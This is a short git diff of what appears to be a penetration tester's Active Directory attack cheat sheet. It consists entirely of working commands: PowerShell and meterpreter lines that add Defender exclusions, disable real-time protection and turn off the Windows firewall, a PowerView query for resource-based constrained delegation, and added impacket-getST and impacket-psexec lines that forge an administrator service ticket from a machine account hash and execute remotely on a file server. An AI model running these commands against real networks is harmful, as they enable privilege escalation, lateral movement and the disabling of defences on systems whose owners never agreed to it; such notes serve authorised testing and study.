@@ -6,6 +6,9 @@ powershell -a "Add-MpPreference -ExclusionPath C:\windows\tasks"
 execute -Hf powershell -a "Add-MpPreference -ExclusionPath C:\windows\tasks" // meterpreter
 
 $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+proxychains impacket-getST -spn cifs/file02.x.com -impersonate 'administrator' 'x.com/WEB05$' -hashes :e8...<WEB05$ NTLM>...ab -dc-ip 172.16.X.100
+KRB5CCNAME=/your/path/administrator.ccache proxychains impacket-psexec -k -no-pass -target-ip 172.16.X.104 administrator@file02.jijistudio.com
+
 
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
